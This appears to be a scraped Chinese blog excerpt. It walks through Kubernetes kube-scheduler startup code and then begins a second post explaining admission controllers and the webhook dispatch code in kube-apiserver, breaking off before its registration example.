*scheduler.Scheduler) error { // To help debugging, immediately log version klog.InfoS(\u0026quot;Starting Kubernetes Scheduler\u0026quot;, \u0026quot;version\u0026quot;, version.Get()) klog.InfoS(\u0026quot;Golang settings\u0026quot;, \u0026quot;GOGC\u0026quot;, os.Getenv(\u0026quot;GOGC\u0026quot;), \u0026quot;GOMAXPROCS\u0026quot;, os.Getenv(\u0026quot;GOMAXPROCS\u0026quot;), \u0026quot;GOTRACEBACK\u0026quot;, os.Getenv(\u0026quot;GOTRACEBACK\u0026quot;)) // Configz registration. if cz, err := configz.New(\u0026quot;componentconfig\u0026quot;); err == nil { cz.Set(cc.ComponentConfig) } else { return fmt.Errorf(\u0026quot;unable to register configz: %s\u0026quot;, err) } // Start events processing pipeline. cc.EventBroadcaster.StartRecordingToSink(ctx.Done()) defer cc.EventBroadcaster.Shutdown() // Setup healthz checks. var checks []healthz.HealthChecker if cc.ComponentConfig.LeaderElection.LeaderElect { checks = append(checks, cc.LeaderElection.WatchDog) } waitingForLeader := make(chan struct{}) isLeader := func() bool { select { case _, ok := \u0026lt;-waitingForLeader: // if channel is closed, we are leading return !ok default: // channel is open, we are waiting for a leader return false } } // Start up the healthz server. if cc.SecureServing != nil { handler := buildHandlerChain(newHealthzAndMetricsHandler(\u0026amp;cc.ComponentConfig, cc.InformerFactory, isLeader, checks...), cc.Authentication.Authenticator, cc.Authorization.Authorizer) // TODO: handle stoppedCh and listenerStoppedCh returned by c.SecureServing.Serve if _, _, err := cc.SecureServing.Serve(handler, 0, ctx.Done()); err != nil { // fail early for secure handlers, removing the old error loop from above return fmt.Errorf(\u0026quot;failed to start secure server: %v\u0026quot;, err) } } // Start all informers. cc.InformerFactory.Start(ctx.Done()) // DynInformerFactory can be nil in tests. if cc.DynInformerFactory != nil { cc.DynInformerFactory.Start(ctx.Done()) } // Wait for all caches to sync before scheduling. cc.InformerFactory.WaitForCacheSync(ctx.Done()) // DynInformerFactory can be nil in tests. if cc.DynInformerFactory != nil { cc.DynInformerFactory.WaitForCacheSync(ctx.Done()) } // If leader election is enabled, runCommand via LeaderElector until done and exit. if cc.LeaderElection != nil { cc.LeaderElection.Callbacks = leaderelection.LeaderCallbacks{ OnStartedLeading: func(ctx context.Context) { close(waitingForLeader) sched.Run(ctx) }, OnStoppedLeading: func() { select { case \u0026lt;-ctx.Done(): // We were asked to terminate. Exit 0. klog.InfoS(\u0026quot;Requested to terminate, exiting\u0026quot;) os.Exit(0) default: // We lost the lock. klog.ErrorS(nil, \u0026quot;Leaderelection lost\u0026quot;) klog.FlushAndExit(klog.ExitFlushTimeout, 1) } }, } leaderElector, err := leaderelection.NewLeaderElector(*cc.LeaderElection) if err != nil { return fmt.Errorf(\u0026quot;couldn't create leader elector: %v\u0026quot;, err) } leaderElector.Run(ctx) return fmt.Errorf(\u0026quot;lost lease\u0026quot;) } // Leader election is disabled, so runCommand inline until done. close(waitingForLeader) sched.Run(ctx) return fmt.Errorf(\u0026quot;finished without leader elect\u0026quot;) } 上面看到了 runCommend 是作为启动 scheduler 的工作，那么通过参数构建一个 scheduler 则是在 Setup 中完成的。\n// Setup creates a completed config and a scheduler based on the command args and options func Setup(ctx context.Context, opts *options.Options, outOfTreeRegistryOptions ...Option) (*schedulerserverconfig.CompletedConfig, *scheduler.Scheduler, error) { if cfg, err := latest.Default(); err != nil { return nil, nil, err } else { opts.ComponentConfig = cfg } // 验证参数 if errs := opts.Validate(); len(errs) \u0026gt; 0 { return nil, nil, utilerrors.NewAggregate(errs) } // 构建一个config对象 c, err := opts.Config() if err != nil { return nil, nil, err } // 返回一个config对象，包含了scheduler所需的配置，如informer，leader selection cc := c.Complete() outOfTreeRegistry := make(runtime.Registry) for _, option := range outOfTreeRegistryOptions { if err := option(outOfTreeRegistry); err != nil { return nil, nil, err } } recorderFactory := getRecorderFactory(\u0026amp;cc) completedProfiles := make([]kubeschedulerconfig.KubeSchedulerProfile, 0) // 创建出来的scheduler sched, err := scheduler.New(cc.Client, cc.InformerFactory, cc.DynInformerFactory, recorderFactory, ctx.Done(), scheduler.WithComponentConfigVersion(cc.ComponentConfig.TypeMeta.APIVersion), scheduler.WithKubeConfig(cc.KubeConfig), scheduler.WithProfiles(cc.ComponentConfig.Profiles...), scheduler.WithPercentageOfNodesToScore(cc.ComponentConfig.PercentageOfNodesToScore), scheduler.WithFrameworkOutOfTreeRegistry(outOfTreeRegistry), scheduler.WithPodMaxBackoffSeconds(cc.ComponentConfig.PodMaxBackoffSeconds), scheduler.WithPodInitialBackoffSeconds(cc.ComponentConfig.PodInitialBackoffSeconds), scheduler.WithPodMaxInUnschedulablePodsDuration(cc.PodMaxInUnschedulablePodsDuration), scheduler.WithExtenders(cc.ComponentConfig.Extenders...), scheduler.WithParallelism(cc.ComponentConfig.Parallelism), scheduler.WithBuildFrameworkCapturer(func(profile kubeschedulerconfig.KubeSchedulerProfile) { // Profiles are processed during Framework instantiation to set default plugins and configurations. Capturing them for logging completedProfiles = append(completedProfiles, profile) }), ) if err != nil { return nil, nil, err } if err := options.LogOrWriteConfig(opts.WriteConfigTo, \u0026amp;cc.ComponentConfig, completedProfiles); err != nil { return nil, nil, err } return \u0026amp;cc, sched, nil } 上面了解到了 scheduler 是如何被构建出来的，下面就看看 构建时参数是如何传递进来的，而对象 option就是对应需要的配置结构，而 ApplyTo 则是将启动时传入的参数转化为构建 scheduler 所需的配置。\n对于Deprecated flags可以参考官方对于kube-scheduler启动参数的说明 [5]\n对于如何编写一个scheduler config请参考 [6] 与 [7]\nfunc (o *Options) ApplyTo(c *schedulerappconfig.Config) error { if len(o.ConfigFile) == 0 { // 在没有指定 --config时会找到 Deprecated flags:参数 // 通过kube-scheduler --help可以看到这些被弃用的参数 o.ApplyDeprecated() o.ApplyLeaderElectionTo(o.ComponentConfig) c.ComponentConfig = *o.ComponentConfig } else { // 这里就是指定了--config cfg, err := loadConfigFromFile(o.ConfigFile) if err != nil { return err } // 这里会将leader选举的参数附加到配置中 o.ApplyLeaderElectionTo(cfg) if err := validation.ValidateKubeSchedulerConfiguration(cfg); err != nil { return err } c.ComponentConfig = *cfg } if err := o.SecureServing.ApplyTo(\u0026amp;c.SecureServing, \u0026amp;c.LoopbackClientConfig); err != nil { return err } if o.SecureServing != nil \u0026amp;\u0026amp; (o.SecureServing.BindPort != 0 || o.SecureServing.Listener != nil) { if err := o.Authentication.ApplyTo(\u0026amp;c.Authentication, c.SecureServing, nil); err != nil { return err } if err := o.Authorization.ApplyTo(\u0026amp;c.Authorization); err != nil { return err } } o.Metrics.Apply() // Apply value independently instead of using ApplyDeprecated() because it can't be configured via ComponentConfig. if o.Deprecated != nil { c.PodMaxInUnschedulablePodsDuration = o.Deprecated.PodMaxInUnschedulablePodsDuration } return nil } Setup 后会new一个 schedueler , New 则是这个动作，在里面可以看出，会初始化一些informer与 Pod的list等操作。\nfunc New(client clientset.Interface, informerFactory informers.SharedInformerFactory, dynInformerFactory dynamicinformer.DynamicSharedInformerFactory, recorderFactory profile.RecorderFactory, stopCh \u0026lt;-chan struct{}, opts ...Option) (*Scheduler, error) { stopEverything := stopCh if stopEverything == nil { stopEverything = wait.NeverStop } options := defaultSchedulerOptions // 默认调度策略，如percentageOfNodesToScore for _, opt := range opts { opt(\u0026amp;options) // opt 是传入的函数，会返回一个schedulerOptions即相应的一些配置 } if options.applyDefaultProfile { // 这个是个bool类型，默认scheduler会到这里 // Profile包含了调度器的名称与调度器在两个过程中使用的插件 var versionedCfg v1beta3.KubeSchedulerConfiguration scheme.Scheme.Default(\u0026amp;versionedCfg) cfg := schedulerapi.KubeSchedulerConfiguration{} // 初始化一个配置，这个是--config传入的类型。因为默认的调度策略会初始化 // convert 会将in转为out即versionedCfg转换为cfg if err := scheme.Scheme.Convert(\u0026amp;versionedCfg, \u0026amp;cfg, nil); err != nil { return nil, err } options.profiles = cfg.Profiles } registry := frameworkplugins.NewInTreeRegistry() // 调度框架的注册 if err := registry.Merge(options.frameworkOutOfTreeRegistry); err != nil { return nil, err } metrics.Register() // 指标类 extenders, err := buildExtenders(options.extenders, options.profiles) if err != nil { return nil, fmt.Errorf(\u0026quot;couldn't build extenders: %w\u0026quot;, err) } podLister := informerFactory.Core().V1().Pods().Lister() nodeLister := informerFactory.Core().V1().Nodes().Lister() // The nominator will be passed all the way to framework instantiation. nominator := internalqueue.NewPodNominator(podLister) snapshot := internalcache.NewEmptySnapshot() clusterEventMap := make(map[framework.ClusterEvent]sets.String) profiles, err := profile.NewMap(options.profiles, registry, recorderFactory, stopCh, frameworkruntime.WithComponentConfigVersion(options.componentConfigVersion), frameworkruntime.WithClientSet(client), frameworkruntime.WithKubeConfig(options.kubeConfig), frameworkruntime.WithInformerFactory(informerFactory), frameworkruntime.WithSnapshotSharedLister(snapshot), frameworkruntime.WithPodNominator(nominator), frameworkruntime.WithCaptureProfile(frameworkruntime.CaptureProfile(options.frameworkCapturer)), frameworkruntime.WithClusterEventMap(clusterEventMap), frameworkruntime.WithParallelism(int(options.parallelism)), frameworkruntime.WithExtenders(extenders), ) if err != nil { return nil, fmt.Errorf(\u0026quot;initializing profiles: %v\u0026quot;, err) } if len(profiles) == 0 { return nil, errors.New(\u0026quot;at least one profile is required\u0026quot;) } podQueue := internalqueue.NewSchedulingQueue( profiles[options.profiles[0].SchedulerName].QueueSortFunc(), informerFactory, internalqueue.WithPodInitialBackoffDuration(time.Duration(options.podInitialBackoffSeconds)*time.Second), internalqueue.WithPodMaxBackoffDuration(time.Duration(options.podMaxBackoffSeconds)*time.Second), internalqueue.WithPodNominator(nominator), internalqueue.WithClusterEventMap(clusterEventMap), internalqueue.WithPodMaxInUnschedulablePodsDuration(options.podMaxInUnschedulablePodsDuration), ) schedulerCache := internalcache.New(durationToExpireAssumedPod, stopEverything) // Setup cache debugger. debugger := cachedebugger.New(nodeLister, podLister, schedulerCache, podQueue) debugger.ListenForSignal(stopEverything) sched := newScheduler( schedulerCache, extenders, internalqueue.MakeNextPodFunc(podQueue), MakeDefaultErrorFunc(client, podLister, podQueue, schedulerCache), stopEverything, podQueue, profiles, client, snapshot, options.percentageOfNodesToScore, ) // 这个就是controller中onAdd等那三个必须的事件函数 addAllEventHandlers(sched, informerFactory, dynInformerFactory, unionedGVKs(clusterEventMap)) return sched, nil } 接下来会启动这个 scheduler， 在上面我们看到 NewSchedulerCommand 构建了一个cobra.Commond对象， runCommand() 最终会返回个 Run，而这个Run就是启动这个 sche 的。\n下面这个 run 是 sche 的运行，他运行并watch资源，直到上下文完成。\nfunc (sched *Scheduler) Run(ctx context.Context) { sched.SchedulingQueue.Run() // We need to start scheduleOne loop in a dedicated goroutine, // because scheduleOne function hangs on getting the next item // from the SchedulingQueue. // If there are no new pods to schedule, it will be hanging there // and if done in this goroutine it will be blocking closing // SchedulingQueue, in effect causing a deadlock on shutdown. go wait.UntilWithContext(ctx, sched.scheduleOne, 0) \u0026lt;-ctx.Done() sched.SchedulingQueue.Close() } 而调用这个 Run 的部分则是作为server的 kube-scheduler 中的 run\n// Run executes the scheduler based on the given configuration. It only returns on error or when context is done. func Run(ctx context.Context, cc *schedulerserverconfig.CompletedConfig, sched *scheduler.Scheduler) error { // To help debugging, immediately log version klog.InfoS(\u0026quot;Starting Kubernetes Scheduler\u0026quot;, \u0026quot;version\u0026quot;, version.Get()) klog.InfoS(\u0026quot;Golang settings\u0026quot;, \u0026quot;GOGC\u0026quot;, os.Getenv(\u0026quot;GOGC\u0026quot;), \u0026quot;GOMAXPROCS\u0026quot;, os.Getenv(\u0026quot;GOMAXPROCS\u0026quot;), \u0026quot;GOTRACEBACK\u0026quot;, os.Getenv(\u0026quot;GOTRACEBACK\u0026quot;)) // Configz registration. if cz, err := configz.New(\u0026quot;componentconfig\u0026quot;); err == nil { cz.Set(cc.ComponentConfig) } else { return fmt.Errorf(\u0026quot;unable to register configz: %s\u0026quot;, err) } // Start events processing pipeline. cc.EventBroadcaster.StartRecordingToSink(ctx.Done()) defer cc.EventBroadcaster.Shutdown() // Setup healthz checks. var checks []healthz.HealthChecker if cc.ComponentConfig.LeaderElection.LeaderElect { checks = append(checks, cc.LeaderElection.WatchDog) } waitingForLeader := make(chan struct{}) isLeader := func() bool { select { case _, ok := \u0026lt;-waitingForLeader: // if channel is closed, we are leading return !ok default: // channel is open, we are waiting for a leader return false } } // Start up the healthz server. if cc.SecureServing != nil { handler := buildHandlerChain(newHealthzAndMetricsHandler(\u0026amp;cc.ComponentConfig, cc.InformerFactory, isLeader, checks...), cc.Authentication.Authenticator, cc.Authorization.Authorizer) // TODO: handle stoppedCh and listenerStoppedCh returned by c.SecureServing.Serve if _, _, err := cc.SecureServing.Serve(handler, 0, ctx.Done()); err != nil { // fail early for secure handlers, removing the old error loop from above return fmt.Errorf(\u0026quot;failed to start secure server: %v\u0026quot;, err) } } // Start all informers. cc.InformerFactory.Start(ctx.Done()) // DynInformerFactory can be nil in tests. if cc.DynInformerFactory != nil { cc.DynInformerFactory.Start(ctx.Done()) } // Wait for all caches to sync before scheduling. cc.InformerFactory.WaitForCacheSync(ctx.Done()) // DynInformerFactory can be nil in tests. if cc.DynInformerFactory != nil { cc.DynInformerFactory.WaitForCacheSync(ctx.Done()) } // If leader election is enabled, runCommand via LeaderElector until done and exit. if cc.LeaderElection != nil { cc.LeaderElection.Callbacks = leaderelection.LeaderCallbacks{ OnStartedLeading: func(ctx context.Context) { close(waitingForLeader) sched.Run(ctx) }, OnStoppedLeading: func() { select { case \u0026lt;-ctx.Done(): // We were asked to terminate. Exit 0. klog.InfoS(\u0026quot;Requested to terminate, exiting\u0026quot;) os.Exit(0) default: // We lost the lock. klog.ErrorS(nil, \u0026quot;Leaderelection lost\u0026quot;) klog.FlushAndExit(klog.ExitFlushTimeout, 1) } }, } leaderElector, err := leaderelection.NewLeaderElector(*cc.LeaderElection) if err != nil { return fmt.Errorf(\u0026quot;couldn't create leader elector: %v\u0026quot;, err) } leaderElector.Run(ctx) return fmt.Errorf(\u0026quot;lost lease\u0026quot;) } // Leader election is disabled, so runCommand inline until done. close(waitingForLeader) sched.Run(ctx) return fmt.Errorf(\u0026quot;finished without leader elect\u0026quot;) } 而上面的 server.Run 会被 runCommand 也就是在 NewSchedulerCommand 时被返回，在 kube-scheduler 的入口文件中被执行。\ncc, sched, err := Setup(ctx, opts, registryOptions...) if err != nil { return err } return Run(ctx, cc, sched) 至此，整个 kube-scheduler 启动流就分析完了，这个的流程可以用下图表示\n图2：scheduler server运行流程 Reference\n[1] kube scheduler\n[2] Scheduler Algorithm in Kubernetes\n[3] scheduling framework\n[4] permit\n[5] kube-scheduler parmater\n[6] kube-scheduler config.v1beta3/\n[7] kube-scheduler config\n","permalink":"https://www.oomkill.com/2022/07/ch16-scheduler/","summary":"","title":"kubernetes的决策组件 - kube-scheduler原理分析"},{"content":" 本文是关于Kubernetes 4A解析的第三章\n深入理解Kubernetes 4A - Authentication源码解析 深入理解Kubernetes 4A - Authorization源码解析 深入理解Kubernetes 4A - Admission Control源码解析 深入理解Kubernetes 4A - Audit源码解析 所有关于Kubernetes 4A部分代码上传至仓库 github.com/cylonchau/hello-k8s-4A\n如有错别字或理解错误地方请多多担待，代码是以1.24进行整理，实验是以1.19环境进行，差别不大\nBACKGROUND admission controllers的特点：\n可定制性：准入功能可针对不同的场景进行调整。 可预防性：审计则是为了检测问题，而准入控制器可以预防问题发生 可扩展性：在kubernetes自有的验证机制外，增加了另外的防线，弥补了RBAC仅能对资源提供安全保证。 下图，显示了用户操作资源的流程，可以看出 admission controllers 作用是在通过身份验证资源持久化之前起到拦截作用。在准入控制器的加入会使kubernetes增加了更高级的安全功能。\n图：Kubernetes API 请求的请求处理步骤图 Source：https://kubernetes.io/blog/2019/03/21/a-guide-to-kubernetes-admission-controllers/ 这里找到一个大佬博客画的图，通过两张图可以很清晰的了解到admission webhook流程，与官方给出的不一样的地方在于，这里清楚地定位了kubernetes admission webhook 处于准入控制中，RBAC之后，push 之前。\n图：Kubernetes API 请求的请求处理步骤图（详细） Source：https://www.armosec.io/blog/kubernetes-admission-controller/ 两种控制器有什么区别？ 根据官方提供的说法是\nMutating controllers may modify related objects to the requests they admit; validating controllers may not\n从结构图中也可以看出，validating 是在持久化之前，而 Mutating 是在结构验证前，根据这些特性我们可以使用 Mutating 修改这个资源对象内容（如增加验证的信息），在 validating 中验证是否合法。\ncomposition of admission controllers kubernetes中的 admission controllers 由两部分组成：\n内置在APIServer中的准入控制器 build-in li.st 特殊的控制器；也是内置在APIServer中，但提供一些自定义的功能 MutatingAdmission ValidatingAdmission Mutating 控制器可以修改他们处理的资源对象，Validating 控制器不会。当在任何一个阶段中的任何控制器拒绝这个了请求，则会立即拒绝整个请求，并将错误返回。\nadmission webhook 由于准入控制器是内置在 kube-apiserver 中的，这种情况下就限制了admission controller的可扩展性。在这种背景下，kubernetes提供了一种可扩展的准入控制器 extensible admission controllers，这种行为叫做动态准入控制 Dynamic Admission Control，而提供这个功能的就是 admission webhook 。\nadmission webhook 通俗来讲就是 HTTP 回调，通过定义一个http server，接收准入请求并处理。用户可以通过kubernetes提供的两种类型的 admission webhook，validating admission webhook 和 mutating admission webhook。来完成自定义的准入策略的处理。\nwebhook 就是\n注：从上面的流程图也可以看出，admission webhook 也是有顺序的。首先调用mutating webhook，然后会调用validating webhook。\n如何使用准入控制器 使用条件：kubernetes v1.16 使用 admissionregistration.k8s.io/v1 ；kubernetes v1.9 使用 admissionregistration.k8s.io/v1beta1。\n如何在集群中开启准入控制器? ：查看kube-apiserver 的启动参数 --enable-admission-plugins ；通过该参数来配置要启动的准入控制器，如 --enable-admission-plugins=NodeRestriction 多个准入控制器以 , 分割，顺序无关紧要。 反之使用 --disable-admission-plugins 参数可以关闭相应的准入控制器（Refer to apiserver opts）。\n通过 kubectl 命令可以看到，当前kubernetes集群所支持准入控制器的版本\n$ kubectl api-versions | grep admissionregistration.k8s.io/v1 admissionregistration.k8s.io/v1 admissionregistration.k8s.io/v1beta1 webhook工作原理 通过上面的学习，已经了解到了两种webhook的工作原理如下所示：\nmutating webhook，会在持久化前拦截在 MutatingWebhookConfiguration 中定义的规则匹配的请求。MutatingAdmissionWebhook 通过向 mutating webhook 服务器发送准入请求来执行验证。\nvalidaing webhook，会在持久化前拦截在 ValidatingWebhookConfiguration 中定义的规则匹配的请求。ValidatingAdmissionWebhook 通过将准入请求发送到 validating webhook server来执行验证。\n那么接下来将从源码中看这个在这个工作流程中，究竟做了些什么？\n资源类型 对于 1.9 版本之后，也就是 v1 版本 ，admission 被定义在 k8s.io\\api\\admissionregistration\\v1\\types.go ，大同小异，因为本地只有1.18集群，所以以这个讲解。\n对于 Validating Webhook 来讲实现主要都在webhook中\ntype ValidatingWebhookConfiguration struct { // 每个api必须包含下列的metadata，这个是kubernetes规范，可以在注释中的url看到相关文档 metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` metav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=metadata\u0026quot;` // Webhooks在这里被表示为[]ValidatingWebhook，表示我们可以注册多个 // +optional // +patchMergeKey=name // +patchStrategy=merge Webhooks []ValidatingWebhook `json:\u0026quot;webhooks,omitempty\u0026quot; patchStrategy:\u0026quot;merge\u0026quot; patchMergeKey:\u0026quot;name\u0026quot; protobuf:\u0026quot;bytes,2,rep,name=Webhooks\u0026quot;` } webhook，则是对这种类型的webhook提供的操作、资源等。对于这部分不做过多的注释了，因为这里本身为kubernetes API资源，官网有很详细的例子与说明。这里更多字段的意思的可以参考官方 doc\ntype ValidatingWebhook struct { // admission webhook的名词，Required Name string `json:\u0026quot;name\u0026quot; protobuf:\u0026quot;bytes,1,opt,name=name\u0026quot;` // ClientConfig 定义了与webhook通讯的方式 Required ClientConfig WebhookClientConfig `json:\u0026quot;clientConfig\u0026quot; protobuf:\u0026quot;bytes,2,opt,name=clientConfig\u0026quot;` // rule表示了webhook对于哪些资源及子资源的操作进行关注 Rules []RuleWithOperations `json:\u0026quot;rules,omitempty\u0026quot; protobuf:\u0026quot;bytes,3,rep,name=rules\u0026quot;` // FailurePolicy 对于无法识别的value将如何处理，allowed/Ignore optional FailurePolicy *FailurePolicyType `json:\u0026quot;failurePolicy,omitempty\u0026quot; protobuf:\u0026quot;bytes,4,opt,name=failurePolicy,casttype=FailurePolicyType\u0026quot;` // matchPolicy 定义了如何使用“rules”列表来匹配传入的请求。 MatchPolicy *MatchPolicyType `json:\u0026quot;matchPolicy,omitempty\u0026quot; protobuf:\u0026quot;bytes,9,opt,name=matchPolicy,casttype=MatchPolicyType\u0026quot;` NamespaceSelector *metav1.LabelSelector `json:\u0026quot;namespaceSelector,omitempty\u0026quot; protobuf:\u0026quot;bytes,5,opt,name=namespaceSelector\u0026quot;` SideEffects *SideEffectClass `json:\u0026quot;sideEffects\u0026quot; protobuf:\u0026quot;bytes,6,opt,name=sideEffects,casttype=SideEffectClass\u0026quot;` AdmissionReviewVersions []string `json:\u0026quot;admissionReviewVersions\u0026quot; protobuf:\u0026quot;bytes,8,rep,name=admissionReviewVersions\u0026quot;` } 到这里了解了一个webhook资源的定义，那么这个如何使用呢？通过 Find Usages 找到一个 k8s.io/apiserver/pkg/admission/plugin/webhook/accessors.go 在使用它。这里没有注释，但在结构上可以看出，包含客户端与一系列选择器组成\ntype mutatingWebhookAccessor struct { *v1.MutatingWebhook uid string configurationName string initObjectSelector sync.Once objectSelector labels.Selector objectSelectorErr error initNamespaceSelector sync.Once namespaceSelector labels.Selector namespaceSelectorErr error initClient sync.Once client *rest.RESTClient clientErr error } accessor 因为包含了整个webhookconfig定义的一些动作（这里个人这么觉得）。\naccessor.go 下面 有一个 GetRESTClient 方法 ，通过这里可以看出，这里做的就是使用根据 accessor 构造一个客户端。\nfunc (m *mutatingWebhookAccessor) GetRESTClient(clientManager *webhookutil.ClientManager) (*rest.RESTClient, error) { m.initClient.Do(func() { m.client, m.clientErr = clientManager.HookClient(hookClientConfigForWebhook(m)) }) return m.client, m.clientErr } 到这步骤已经没必要往下看了，因已经知道这里是请求webhook前的步骤了，下面就是何时请求了。\nk8s.io\\apiserver\\pkg\\admission\\plugin\\webhook\\validating\\dispatcher.go 下面有两个方法，Dispatch去请求我们自己定义的webhook\nfunc (d *validatingDispatcher) Dispatch(ctx context.Context, attr admission.Attributes, o admission.ObjectInterfaces, hooks []webhook.WebhookAccessor) error { var relevantHooks []*generic.WebhookInvocation // Construct all the versions we need to call our webhooks versionedAttrs := map[schema.GroupVersionKind]*generic.VersionedAttributes{} for _, hook := range hooks { invocation, statusError := d.plugin.ShouldCallHook(hook, attr, o) if statusError != nil { return statusError } if invocation == nil { continue } relevantHooks = append(relevantHooks, invocation) // If we already have this version, continue if _, ok := versionedAttrs[invocation.Kind]; ok { continue } versionedAttr, err := generic.NewVersionedAttributes(attr, invocation.Kind, o) if err != nil { return apierrors.NewInternalError(err) } versionedAttrs[invocation.Kind] = versionedAttr } if len(relevantHooks) == 0 { // no matching hooks return nil } // Check if the request has already timed out before spawning remote calls select { case \u0026lt;-ctx.Done(): // parent context is canceled or timed out, no point in continuing return apierrors.NewTimeoutError(\u0026quot;request did not complete within requested timeout\u0026quot;, 0) default: } wg := sync.WaitGroup{} errCh := make(chan error, len(relevantHooks)) wg.Add(len(relevantHooks)) // 循环所有相关的注册的hook for i := range relevantHooks { go func(invocation *generic.WebhookInvocation) { defer wg.Done() // invacation 中有一个 Accessor,Accessor注册了一个相关的webhookconfig // 也就是我们 kubectl -f 注册进来的那个webhook的相关配置 hook, ok := invocation.Webhook.GetValidatingWebhook() if !ok { utilruntime.HandleError(fmt.Errorf(\u0026quot;validating webhook dispatch requires v1.ValidatingWebhook, but got %T\u0026quot;, hook)) return } versionedAttr := versionedAttrs[invocation.Kind] t := time.Now() // 调用了callHook去请求我们自定义的webhook err := d.callHook(ctx, hook, invocation, versionedAttr) ignoreClientCallFailures := hook.FailurePolicy != nil \u0026amp;\u0026amp; *hook.FailurePolicy == v1.Ignore rejected := false if err != nil { switch err := err.(type) { case *webhookutil.ErrCallingWebhook: if !ignoreClientCallFailures { rejected = true admissionmetrics.Metrics.ObserveWebhookRejection(hook.Name, \u0026quot;validating\u0026quot;, string(versionedAttr.Attributes.GetOperation()), admissionmetrics.WebhookRejectionCallingWebhookError, 0) } case *webhookutil.ErrWebhookRejection: rejected = true admissionmetrics.Metrics.ObserveWebhookRejection(hook.Name, \u0026quot;validating\u0026quot;, string(versionedAttr.Attributes.GetOperation()), admissionmetrics.WebhookRejectionNoError, int(err.Status.ErrStatus.Code)) default: rejected = true admissionmetrics.Metrics.ObserveWebhookRejection(hook.Name, \u0026quot;validating\u0026quot;, string(versionedAttr.Attributes.GetOperation()), admissionmetrics.WebhookRejectionAPIServerInternalError, 0) } } admissionmetrics.Metrics.ObserveWebhook(time.Since(t), rejected, versionedAttr.Attributes, \u0026quot;validating\u0026quot;, hook.Name) if err == nil { return } if callErr, ok := err.(*webhookutil.ErrCallingWebhook); ok { if ignoreClientCallFailures { klog.Warningf(\u0026quot;Failed calling webhook, failing open %v: %v\u0026quot;, hook.Name, callErr) utilruntime.HandleError(callErr) return } klog.Warningf(\u0026quot;Failed calling webhook, failing closed %v: %v\u0026quot;, hook.Name, err) errCh \u0026lt;- apierrors.NewInternalError(err) return } if rejectionErr, ok := err.(*webhookutil.ErrWebhookRejection); ok { err = rejectionErr.Status } klog.Warningf(\u0026quot;rejected by webhook %q: %#v\u0026quot;, hook.Name, err) errCh \u0026lt;- err }(relevantHooks[i]) } wg.Wait() close(errCh) var errs []error for e := range errCh { errs = append(errs, e) } if len(errs) == 0 { return nil } if len(errs) \u0026gt; 1 { for i := 1; i \u0026lt; len(errs); i++ { // TODO: merge status errors; until then, just return the first one. utilruntime.HandleError(errs[i]) } } return errs[0] } callHook 可以理解为真正去请求我们自定义的webhook服务的动作\nfunc (d *validatingDispatcher) callHook(ctx context.Context, h *v1.ValidatingWebhook, invocation *generic.WebhookInvocation, attr *generic.VersionedAttributes) error { if attr.Attributes.IsDryRun() { if h.SideEffects == nil { return \u0026amp;webhookutil.ErrCallingWebhook{WebhookName: h.Name, Reason: fmt.Errorf(\u0026quot;Webhook SideEffects is nil\u0026quot;)} } if !(*h.SideEffects == v1.SideEffectClassNone || *h.SideEffects == v1.SideEffectClassNoneOnDryRun) { return webhookerrors.NewDryRunUnsupportedErr(h.Name) } } uid, request, response, err := webhookrequest.CreateAdmissionObjects(attr, invocation) if err != nil { return \u0026amp;webhookutil.ErrCallingWebhook{WebhookName: h.Name, Reason: err} } // 发生请求，可以看到，这里从上面的讲到的地方获取了一个客户端 client, err := invocation.Webhook.GetRESTClient(d.cm) if err != nil { return \u0026amp;webhookutil.ErrCallingWebhook{WebhookName: h.Name, Reason: err} } trace := utiltrace.New(\u0026quot;Call validating webhook\u0026quot;, utiltrace.Field{\u0026quot;configuration\u0026quot;, invocation.Webhook.GetConfigurationName()}, utiltrace.Field{\u0026quot;webhook\u0026quot;, h.Name}, utiltrace.Field{\u0026quot;resource\u0026quot;, attr.GetResource()}, utiltrace.Field{\u0026quot;subresource\u0026quot;, attr.GetSubresource()}, utiltrace.Field{\u0026quot;operation\u0026quot;, attr.GetOperation()}, utiltrace.Field{\u0026quot;UID\u0026quot;, uid}) defer trace.LogIfLong(500 * time.Millisecond) // 这里设置超时，超时时长就是在yaml资源清单中设置的那个值 if h.TimeoutSeconds != nil { var cancel context.CancelFunc ctx, cancel = context.WithTimeout(ctx, time.Duration(*h.TimeoutSeconds)*time.Second) defer cancel() } // 直接用post请求我们自己定义的webhook接口 r := client.Post().Body(request) // if the context has a deadline, set it as a parameter to inform the backend if deadline, hasDeadline := ctx.Deadline(); hasDeadline { // compute the timeout if timeout := time.Until(deadline); timeout \u0026gt; 0 { // if it's not an even number of seconds, round up to the nearest second if truncated := timeout.Truncate(time.Second); truncated != timeout { timeout = truncated + time.Second } // set the timeout r.Timeout(timeout) } } if err := r.Do(ctx).Into(response); err != nil { return \u0026amp;webhookutil.ErrCallingWebhook{WebhookName: h.Name, Reason: err} } trace.Step(\u0026quot;Request completed\u0026quot;) result, err := webhookrequest.VerifyAdmissionResponse(uid, false, response) if err != nil { return \u0026amp;webhookutil.ErrCallingWebhook{WebhookName: h.Name, Reason: err} } for k, v := range result.AuditAnnotations { key := h.Name + \u0026quot;/\u0026quot; + k if err := attr.Attributes.AddAnnotation(key, v); err != nil { klog.Warningf(\u0026quot;Failed to set admission audit annotation %s to %s for validating webhook %s: %v\u0026quot;, key, v, h.Name, err) } } if result.Allowed { return nil } return \u0026amp;webhookutil.ErrWebhookRejection{Status: webhookerrors.ToStatusErr(h.Name, result.Result)} } 走到这里基本上对 admission webhook 有了大致的了解，可以知道这个操作是由 apiserver 完成的。下面就实际操作下自定义一个webhook。\n这里还有两个概念，就是请求参数 AdmissionRequest 和相应参数 AdmissionResponse，这些可以在 callHook 中看到，这两个参数被定义在 k8s.io\\api\\admission\\v1\\types.go ；这两个参数也就是我们在自定义 webhook 时需要处理接收到的body的结构，以及我们响应内容数据结构。\n如何编写一个自定义的admission webhook 通过上面的学习了解到了，自定义的webhook就是做为kubernetes提供给用户两种admission controller来验证自定义业务的一个中间件 admission webhook。本质上他是一个HTTP Server，用户可以使用任何语言来完成这部分功能。当然，如果涉及到需要对kubernetes集群资源操作的话，还是建议使用kubernetes官方提供了SDK的编程语言来完成自定义的webhook。\n那么完成一个自定义admission webhook需要两个步骤：\n将相关的webhook config注册给kubernetes，也就是让kubernetes知道你的webhook 准备一个http server来处理 apiserver发过来验证的信息 注：这里使用go net/http包，本身不区分方法处理HTTP的何种请求，如果用其他框架实现的，如django，需要指定对应方法需要为POST\n向kubernetes注册webhook对象 